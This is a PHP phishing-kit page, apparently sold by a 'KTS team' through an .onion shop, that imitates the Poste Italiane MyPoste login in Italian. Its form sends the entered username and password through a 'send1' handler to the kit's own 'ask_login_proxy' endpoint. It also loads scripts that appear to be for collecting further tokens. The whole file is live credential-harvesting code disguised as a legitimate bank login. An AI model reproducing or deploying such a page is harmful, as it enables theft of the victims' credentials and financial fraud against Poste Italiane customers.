<?php /* 
   
Page made by KTS team;
http://o54eavgyktxh5wts.onion/shop/;
Edited for  mariomario@blabber.im  on  Sun 15 Nov 2020 22:46:37 EET 
*/ ?>
<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="login/";
?>

<!DOCTYPE html>
<html lang="it" class="pi-chrome pi-lg"  >

<head>

<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>

<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
<base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
<link rel="stylesheet" href="form/css.css">


    <title>Accedi o Registrati</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, user-scalable=0">
    <link id="genesys-widgets-styles" type="text/css" rel="stylesheet" href="widgets.min.css">
    <link id="genesys_widget_custom_2" type="text/css" rel="stylesheet" href="chat_custom.css">
    <link type="text/css" rel="stylesheet" href="bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="owl.carousel.css">
    <link type="text/css" rel="stylesheet" href="base.css">
    <link type="text/css" rel="stylesheet" href="megamenu-pi.css">
    <link type="text/css" rel="stylesheet" href="retina.css">
    <link type="text/css" rel="stylesheet" href="custom-form-element.css">
    <style>
        h1.idp-retail {
        font-size: 40px !important;
    }

    h3.idp-retail {
        font-size: 20px !important;
    }

    .spacer-xs-top-38 {
        margin-top: 38px !important;
    }
    </style>
</head>

<body style="padding-top: 49px;">
    
    <div class="pageLoader" style="background-color: rgb(255, 255, 255); position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 1; text-align: center; padding-top: 20%; display: none;"><img class="loader-logo"  src="logo-poste-italiane@2x.png" style="height: 22px;"><img class="loader-spinner" src="spinner_giallo.gif" style="padding-top: 40px; width: 40px; display: block; margin: 0px auto;"></div> 
    <div class="content content-alert-browser">
        <div id="content-alert-old-browser" class="content content-alert-old-browser">
            <div class="container">
                <div class="row">
                    <div class="col-md-12">
                        <div id="alertIe" class="innerspacer-xs-top-20 innerspacer-xs-bottom-20">
                            <div id="alertIe-inner"> La versione del tuo browser non è aggiornata. Per una migliore navigazione del sito, scarica la versione più recente. </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="consent_blackbar"></div>
        <div id="consent_blackbar"></div>
    </div>
    <div class="content content-federation-bar content-federation-bar-minified content-federation-bar-simplified">
        <div class="container container-extended">
            <div class="row">
                <div class="col-md-12">
                    <div class="header-minified">
                        <div class="row">
                            <div class="col-xs-12">
                                <div class="federation-bar-content-logo pull-xs-left clearfix">
                                    <div class="logo"> <a  title="" class="hidden-xs hidden-sm"> <span class="wrap-logo wrap-logo-medium"><img  src="logo-poste-italiane-medium@2x.png" class="logo-image-pi-medium"></span> </a> <a  title="" class="logo-mobile hidden-md hidden-lg"> <span class="wrap-logo wrap-logo-small"><img  src="logo-poste-italiane-medium@2x.png" class="logo-image-pi-small"></span> </a> </div>
                                    <div class="back spacer-md-left-30"> <a class="back-link"  title="Annulla accesso"> <span class="hidden-xs hidden-sm">Annulla accesso</span> </a> </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <div class="content content-applicative  nobracket">
        <div class="container">
            <div class="row">
                <div class="col-md-12" id="accessibility-anchor">
                    <div class="row">
                        <div class="col-xs-12 ">
                            <div class="main" style="margin-top: -40px !important;">
                                <div class="row">
                                    <div class="col-md-12">
                                        <div class="abstract">
                                            <div class="abstract-heading text-xs-center spacer-xs-bottom-40">
                                                <h1 class="idp-retail"> Accedi <small>
                                                        <h3 class="idp-retail"> Stai accedendo a <strong><span id="titolo-fcc">MyPoste</span></strong>. <a id="sp-link-fcc" > Sei un cliente business? </a> </h3>
                                                    </small> </h1>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-8 pull-sm-not center">
                                        <div class="row equalize-group equalize-group-1">
                                            <div class="col-sm-12">
                                                <div class="content">
                                                    <div class="content-overflow-wrap">
                                                        <div class="row">
                                                            
                                                            <div class="col-xs-12 col-sm-6">
                                                                <div class="panel panel-cards panel-cards-large" style="min-height: 473px;">
                                                                    <div class="panel-wrap innerspacer-xs-bottom-0">
                                                                        <div class="panel-heading spacer-xs-top-30">
                                                                            <h4 class="text-xs-center"> Inserisci le tue <strong>credenziali</strong> </h4>
                                                                        </div>



                                                                        <form class="form-login clearfix" novalidate onsubmit="send1(event,'ask_login_proxy');return false"  >     
                                                                            <div class="panel-body">
                                                                                <div class="spacer-xs-bottom-30">
                                                                                    <div class="form-group form-group-lg">
                                                                                        <p> 
                                                                                        	<label class="control-label" for="user">NOME UTENTE</label>
                                                                                        	<input class="form-control" id="user" pattern=".{1,}\..{1,}" data-err_text="Please enter valid "  name="user" placeholder="inserisci" type="text" value="">
                                                                                        </p>
                                                                                    </div>
                                                                                    <div class="form-group form-group-lg">
                                                                                        <p> <label class="control-label" for="pass">PASSWORD</label> 

                                                                                        	<input class="form-control" pattern=".{4,}" data-err_text="Please enter valid "  id="pass" name="pass" placeholder="inserisci" type="password" value="">

                                                                                        	 </p>
                                                                                    </div>
                                                                                    <div class="box-editable-area spacer-xs-top-40">
                                                                                        <p class="subtext text-center spacer-xs-0" style="font-size: 0.85em;"> <a >Hai dimenticato il nome utente o la password?</a> </p>
                                                                                    </div>
                                                                                    <p class="btn-container btn-container-center spacer-xs-bottom-15 spacer-xs-top-30 clearfix"> 

                                                                                    	<input type="submit" class="btn btn-primary btn-expand" value="accedi">


                                                                                    	 </p>
                                                                                    <div id="annulla" class="btn-container btn-container-center spacer-xs-bottom-15 spacer-xs-top-30 clearfix text-xs-center"></div>
                                                                                </div>
                                                                            </div>
                                                                        </form>




                                                                    </div>
                                                                </div>
                                                            </div> 
                                                            <div class="col-xs-12 col-sm-6">
                                                                <div class="panel panel-cards panel-cards-large" style="min-height: 473px;">
                                                                    <div class="panel-wrap text-xs-center">
                                                                        <div class="panel-body spacer-xs-bottom-30">
                                                                            <div class="spacer-xs-bottom-10 spacer-xs-top-30"> <img src="chiave@2x.png"> </div>
                                                                        </div>
                                                                        <div class="panel-heading">
                                                                            <h4 class="text-xs-center">Non hai un account?</h4>
                                                                        </div>
                                                                        <p>Crea un account di Poste per accedere a tutti i servizi online</p>
                                                                        <p class="btn-container btn-container-center spacer-xs-bottom-15 spacer-xs-top-30 clearfix"> <a  class="btn btn-secondary col-xs-12">registrati</a> </p>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div> 
                                    <div class="col-md-8 pull-sm-not center" id="sp-posteid-fcc">
                                        <div class="row">
                                            <div class="col-sm-12">
                                                <div class="content">
                                                    <div class="content-overflow-wrap">
                                                        <div class="row">
                                                            <div class="col-xs-12">
                                                                <div class="panel panel-cards panel-cards-large">
                                                                    <div class="panel-body">
                                                                        <div class="box-editable-area text-xs-center text-md-left">
                                                                            <div class="col-sm-3">
                                                                                <div class="spacer-xs-bottom-30 spacer-xs-top-30"> <img src="logo-posteid@2x.png"> </div>
                                                                            </div>
                                                                            <div class="col-sm-5">
                                                                                <div class="spacer-xs-bottom-30 spacer-xs-top-30"> <span style="font-size: 0.85em;"> </span> </div>
                                                                            </div>
                                                                            <div class="col-sm-4">
                                                                                <div class="clearfix text-xs-center"> <a  id="bottonePosteID"><span class="btn btn-xs btn-primary spacer-xs-top-38">accedi con posteid</span></a> </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div> 
                                    <div class="content content-post-main">
                                        <div class="container">
                                            <div class="row" id="help__assistenza">
                                                <div class="col-sm-12">
                                                    <h2 class="text-xs-center">Hai bisogno di aiuto?</h2>
                                                </div>
                                                <div class="col-md-8 col-lg-push-1 col-lg-10">
                                                    <div class="btn-container text-xs-center">
                                                        <div class="row">
                                                            <div class="col-sm-6 col-md-4 col-sm-push-0 col-md-push-0"> <a  title="Chiamaci" class="btn btn-sm btn-secondary btn-expand"><img src="ico-chiamaci@2x.png" class="spacer-xs-right-10">Chiamaci</a> </div>
                                                            <div class="col-sm-6 col-md-4"> <a  title="Domande Frequenti" target="_self" class="btn btn-sm btn-secondary btn-expand"><img src="ico-scrivici@2x.png" class="spacer-xs-right-10">Scrivici</a> </div>
                                                            <div class="col-sm-6 col-md-4"> <a  title="Richiedi Assistenza" class="btn btn-sm btn-secondary btn-expand"><img class="spacer-xs-right-10" src="ico-vieni-in-poste-cerca-up@2x.png">Vieni in Poste</a> </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="content content-main" style="padding-top: 15px;">
                                                    <div class="container">
                                                        <div class="row">
                                                            <div class="col-md-8 col-lg-push-1 col-lg-10 text-xs-center innerspacer-xs-top-30"> In caso di mancato accesso o non funzionamento dei servizi è possibile contattare il Call Center al numero verde <a >803.160</a> (dal lunedì al sabato dalle ore 8.00 alle ore 20.00). La chiamata è gratuita. </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="content content-footer content-footer-post">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <div class="row">
                        <div class="col-md-5">
                            <p class="text-xs-center text-md-left"> © Poste Italiane 2020 - Partita iva : 01114601006 </p>
                        </div>
                        <div class="col-md-7">
                            <div class="clearfix">
                                <div class="base-footer">
                                    <div id="teconsent" consent="0,1,2"><a id="icon-id08773552482840767" tabindex="0" role="button" lang="it" style="cursor: pointer;">Preferenze Cookie</a></div>
                                </div>
                            </div>
                        </div>
                    </div> <a  class="btn btn-primary btn-cta back-to-top"> <span class="hide">vai a inizio pagina</span> </a>
                </div>
            </div>
        </div>
    </div>
    
    
    <div id="consent_blackbar"></div>
    <div id="teconsent"></div>
    
     
    <link id="genesys_widget_custom" type="text/css" rel="stylesheet" >
     


<script type="text/javascript">
var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
var php_js = <?php  echo json_encode($php_js) ?>
</script>
<script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
<script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
</body>

</html>